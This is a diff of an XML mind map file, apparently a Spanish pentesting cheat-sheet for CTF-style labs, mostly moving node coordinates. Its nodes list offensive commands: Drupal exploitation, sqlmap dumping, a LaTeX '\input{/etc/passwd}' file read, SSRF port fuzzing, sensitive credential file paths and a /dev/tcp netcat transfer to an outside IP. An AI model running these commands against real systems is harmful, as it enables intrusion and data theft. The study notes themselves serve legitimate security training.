                 </node>
-                <node id="157" posx="1625.0007324218759" posy="585.79126075006252" maxwidth="200" width="60" height="46" side="left" fold="true" treesize="104.99796549479123" color="#dc322f" colorroot="true" layout="Manual">
+                <node id="165" posx="-296.51615265877854" posy="468.86321102675589" maxwidth="200" width="60" height="46" side="left" fold="false" treesize="104.99796549479123" color="#dc322f" colorroot="true" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>CMS</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="159" posx="1425.680582682292" posy="621.78922624485404" maxwidth="200" width="86" height="46" side="left" fold="true" treesize="91.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="167" posx="-495.83630239836248" posy="504.86117652154741" maxwidth="200" width="86" height="46" side="left" fold="false" treesize="91.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>DRUPAL</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="161" posx="1060.6805826822924" posy="598.78922624485358" maxwidth="238.67128499348954" width="265" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="169" posx="-860.83630239836214" posy="481.86117652154695" maxwidth="238.67128499348954" width="265" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>droopescan scan drupal -u $URL</nodename>
                           <nodenote></nodenote>
                         </node>
-                        <node id="163" posx="1029.6805826822927" posy="644.78922624485358" maxwidth="286.67836507161456" width="296" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="171" posx="-891.83630239836214" posy="527.86117652154689" maxwidth="286.67836507161456" width="296" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>drupwn --mode exploit --target $URL</nodename>
                           <nodenote></nodenote>
                           <nodes>
-                            <node id="165" posx="879.68058268229265" posy="644.78922624485358" maxwidth="200" width="50" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                            <node id="173" posx="-1041.8363023983622" posy="527.86117652154689" maxwidth="200" width="50" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                               <formatting/>
                               <nodename>list</nodename>
                               <nodenote></nodenote>
                               <nodes>
-                                <node id="167" posx="584.6805826822922" posy="644.78922624485358" maxwidth="200" width="195" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                                <node id="175" posx="-1336.8363023983641" posy="527.86117652154689" maxwidth="200" width="195" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                                   <formatting/>
                                   <nodename>check CVE-XXXX-XXXX</nodename>
                                   <nodenote></nodenote>
                                   <nodes>
-                                    <node id="169" posx="406.68058268229129" posy="644.78922624485358" maxwidth="200" width="78" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                                    <node id="177" posx="-1514.836302398365" posy="527.86117652154689" maxwidth="200" width="78" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                                       <formatting/>
                                       <nodename>exploit</nodename>
@@ -615,13 +645,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="171" posx="1670.6719563802094" posy="719.80631608860449" maxwidth="200" width="53" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="179" posx="-250.84492870044551" posy="602.87826636529758" maxwidth="200" width="53" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>sqli</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="173" posx="1302.6719563802096" posy="719.80631608860449" maxwidth="242.6875" width="268" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="181" posx="-618.84492870044494" posy="602.87826636529758" maxwidth="242.6875" width="268" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>sqlmap -r request -p $parametro</nodename>
@@ -629,13 +659,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="175" posx="1650.3602701822936" posy="819.12337338027078" maxwidth="200" width="104" height="46" side="left" fold="true" treesize="63.836181640625" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="183" posx="-271.15661489836157" posy="702.19532365696409" maxwidth="200" width="104" height="46" side="left" fold="false" treesize="63.836181640625" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>latex injec</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="177" posx="1399.705891927086" posy="836.95955502089578" maxwidth="200" width="176" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="185" posx="-521.81099315356869" posy="720.03150529758909" maxwidth="200" width="176" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>\input{/etc/passwd}</nodename>
@@ -645,19 +675,19 @@
                 </node>
               </nodes>
             </node>
-            <node id="179" posx="2395.8535550025249" posy="1068.7419942220045" maxwidth="200" width="201" height="46" side="left" fold="false" treesize="297.4963378906258" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="187" posx="474.33666992187136" posy="951.81394449869731" maxwidth="200" width="201" height="46" side="left" fold="false" treesize="297.4963378906258" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>Internal Network Recon</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="181" posx="2195.853555002524" posy="817.24565633137877" maxwidth="200" width="100" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="189" posx="274.33666992187" posy="700.31760660807208" maxwidth="200" width="100" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>netstat -a</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="183" posx="1893.8327420142425" posy="795.75688680012922" maxwidth="265.9755859375" width="292" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="191" posx="-27.684143066412162" posy="678.82883707682254" maxwidth="265.9755859375" width="292" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>ssh -L 9000:127.0.0.1:8000 user@ip</nodename>
@@ -665,13 +695,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="185" posx="2101.527383127524" posy="897.90369669596362" maxwidth="200" width="82" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="193" posx="180.01049804687" posy="780.97564697265693" maxwidth="200" width="82" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ss -tlnp</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="187" posx="1973.5273831275233" posy="898.40369669596362" maxwidth="200" width="86" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="195" posx="52.010498046868179" posy="781.47564697265693" maxwidth="200" width="86" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>chisel</nodename>
@@ -681,13 +711,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="189" posx="2090.8302802629419" posy="1068.0799662272129" maxwidth="200" width="201" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="197" posx="169.31339518228788" posy="951.1519165039058" maxwidth="200" width="201" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>Enum Servicios puertos</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="191" posx="1282.8223050025244" posy="1026.263722737629" maxwidth="692.02376302083314" width="720" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="199" posx="-638.69458007812989" posy="909.33567301432186" maxwidth="692.02376302083314" width="720" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting>
                         <urllink url="http://192.168.1." spos="35" epos="52" embedded="true" ignore="false"/>
@@ -696,7 +726,7 @@
                       <nodename>wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="193" posx="863.82230500252444" posy="1026.263722737629" maxwidth="306.65275065104169" width="319" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="201" posx="-1057.6945800781311" posy="909.33567301432186" maxwidth="306.65275065104169" width="319" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>sqlmap -r request -p $parametro -dump</nodename>
@@ -704,7 +734,7 @@
                         </node>
                       </nodes>
                     </node>
-                    <node id="195" posx="1337.527301747316" posy="1258.9080912272125" maxwidth="707.96101888020837" width="719" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="203" posx="-583.98958333333849" posy="1141.9800415039051" maxwidth="707.96101888020837" width="719" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting>
                         <urllink url="http://192.168.1." spos="35" epos="52" embedded="true" ignore="false"/>
@@ -717,49 +747,49 @@
                 </node>
               </nodes>
             </node>
-            <node id="197" posx="2702.8438707577338" posy="1593.5052795410147" maxwidth="200" width="190" height="46" side="left" fold="false" treesize="705.98116048177121" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="205" posx="781.32698567708042" posy="1520.8185628255203" maxwidth="218.671630859375" width="242" height="46" side="left" fold="false" treesize="868.95983886718955" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
-              <nodename>Internal System Enum</nodename>
+              <nodename>Internal System Enumeration</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="199" posx="2501.8438707577329" posy="1253.0052795410152" maxwidth="200" width="101" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="207" posx="580.32698567707939" posy="1135.3185628255208" maxwidth="200" width="101" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>hostname</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="201" posx="2505.8438707577329" posy="1299.0052795410156" maxwidth="200" width="97" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="209" posx="584.32698567707939" posy="1181.3185628255194" maxwidth="200" width="97" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>uname -a</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="203" posx="2673.4752184139838" posy="1293.0133361816406" maxwidth="200" width="150" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="211" posx="751.9583333333303" posy="1175.3266194661444" maxwidth="200" width="150" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>cat /etc/*release</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="205" posx="2475.8438707577329" posy="1391.0052795410156" maxwidth="200" width="134" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="213" posx="554.32698567707939" posy="1273.3185628255194" maxwidth="200" width="134" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>cat /etc/*issue</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="207" posx="2285.1757392473178" posy="1403.3373514811183" maxwidth="200" width="79" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="215" posx="363.65885416666424" posy="1285.650634765622" maxwidth="200" width="79" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>history</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="209" posx="2557.8438707577338" posy="1482.0052795410147" maxwidth="200" width="45" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="217" posx="636.3269856770803" posy="1364.3185628255185" maxwidth="200" width="45" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ps</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="211" posx="2392.8438707577329" posy="1482.0052795410147" maxwidth="200" width="65" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="219" posx="471.32698567707939" posy="1364.3185628255185" maxwidth="200" width="65" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>ps -A</nodename>
@@ -767,13 +797,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="213" posx="2400.1589749243999" posy="1534.6648661295567" maxwidth="200" width="127" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="221" posx="478.64208984374636" posy="1416.9781494140605" maxwidth="200" width="127" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ps -ef --forest</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="215" posx="2401.5261624243999" posy="1598.3238830566397" maxwidth="200" width="142" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="223" posx="480.00927734374636" posy="1480.6371663411453" maxwidth="200" width="142" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>cat /etc/fstab</nodename>
@@ -781,19 +811,19 @@
 Si es =2, significa que no podemos ver los procesos de otros usuarios
 </nodenote>
                 </node>
-                <node id="217" posx="2521.8438707577329" posy="1709.0052795410147" maxwidth="200" width="81" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="225" posx="600.32698567707939" posy="1591.3185628255203" maxwidth="200" width="81" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>pspy64</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="219" posx="2384.1827379452338" posy="1680.0043843587237" maxwidth="200" width="82" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="227" posx="462.6658528645803" posy="1562.3176676432292" maxwidth="200" width="82" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ls /proc</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="221" posx="2213.5214016822124" posy="1763.3422749837241" maxwidth="200" width="148" height="46" side="left" fold="false" treesize="175.82271321614644" color="#b58900" colorroot="true" layout="Manual">
+                <node id="229" posx="169.35013834635004" posy="1640.3358561197927" maxwidth="200" width="148" height="46" side="left" fold="false" treesize="175.82271321614576" color="#b58900" colorroot="true" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>sensitive Files</nodename>
@@ -816,7 +846,7 @@ $USER/.bash_history or .profile
 /etc/inetd.conf  
 /var/log/dmessage</nodenote>
                   <nodes>
-                    <node id="223" posx="2352.1970201717963" posy="1846.4977111816406" maxwidth="200" width="84" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="231" posx="308.02575683593443" posy="1723.4912923177087" maxwidth="200" width="84" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>procs</nodename>
@@ -830,7 +860,7 @@ $USER/.bash_history or .profile
 /proc/version
 /proc/self/environ</nodenote>
                     </node>
-                    <node id="225" posx="1952.8671861874202" posy="1893.1649881998701" maxwidth="200" width="126" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="233" posx="-91.304077148442843" posy="1770.1585693359382" maxwidth="200" width="126" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>web server</nodename>
@@ -852,25 +882,7 @@ config.php
                     </node>
                   </nodes>
                 </node>
-                <node id="227" posx="2508.1651598202338" posy="1912.4864400227871" maxwidth="200" width="121" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
-                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                  <formatting/>
-                  <nodename>transfer files</nodename>
-                  <nodenote></nodenote>
-                  <nodes>
-                    <node id="229" posx="2380.1651598202338" posy="1912.9864400227871" maxwidth="200" width="61" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>nc</nodename>
-                      <nodenote>file a manda:
-cat &lt; suid3num.py &gt; /dev/tcp/10.10.16.36/4433
-
-receptor 
-nc -lvnp 4433 &gt; suid3num.py</nodenote>
-                    </node>
-                  </nodes>
-                </node>
-                <node id="231" posx="3009.4857164608579" posy="1910.9691060384121" maxwidth="200" width="73" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="239" posx="1087.9688313802046" posy="1793.2823893229177" maxwidth="200" width="73" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>rust</nodename>
@@ -886,7 +898,7 @@ El archivo lib.rs se utiliza para definir la interfaz p&#xFA;blica y las funcion
 
 Cabe mencionar que el uso y la estructura espec&#xED;fica de un archivo lib.rs pueden variar dependiendo del proyecto y las convenciones adoptadas por el equipo de desarrollo.</nodenote>
                   <nodes>
-                    <node id="233" posx="2881.4857164608579" posy="1911.4691060384121" maxwidth="200" width="80" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="241" posx="959.96883138020496" posy="1793.7823893229177" maxwidth="200" width="80" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>lib.rs</nodename>
@@ -899,65 +911,108 @@ let output = Command::new(&#x201C;bash&#x201D;)
                     </node>
                   </nodes>
                 </node>
+                <node id="235" posx="499.96988932291367" posy="1824.1180826822927" maxwidth="200" width="121" height="46" side="left" fold="false" treesize="46.5" color="#dc322f" colorroot="false" layout="Manual">
+                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                  <formatting/>
+                  <nodename>transfer files</nodename>
+                  <nodenote></nodenote>
+                  <nodes>
+                    <node id="237" posx="371.96988932291367" posy="1824.6180826822927" maxwidth="200" width="61" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>nc</nodename>
+                      <nodenote>file a manda:
+cat &lt; suid3num.py &gt; /dev/tcp/10.10.16.36/4433
+
+receptor 
+nc -lvnp 4433 &gt; suid3num.py</nodenote>
+                    </node>
+                  </nodes>
+                </node>
+                <node id="243" posx="582.6640218098928" posy="1911.7784016927087" maxwidth="200" width="89" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                  <formatting/>
+                  <nodename>ls -la /</nodename>
+                  <nodenote>cuando no funciona:
+ifconfig
+ipp addr
+
+para saber si estamos en un contenedor:
+aparecer&#xE1; un directorio Docker</nodenote>
+                </node>
+                <node id="245" posx="653.3269856770803" posy="1957.7784016927087" maxwidth="200" width="77" height="46" side="left" fold="false" treesize="46.500000000000114" color="#dc322f" colorroot="false" layout="Manual">
+                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                  <formatting/>
+                  <nodename>docker</nodename>
+                  <nodenote></nodenote>
+                  <nodes>
+                    <node id="247" posx="525.3269856770803" posy="1958.2784016927087" maxwidth="200" width="103" height="46" side="left" fold="false" treesize="46.000000000000114" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>deepce.sh</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                  </nodes>
+                </node>
               </nodes>
             </node>
           </nodes>
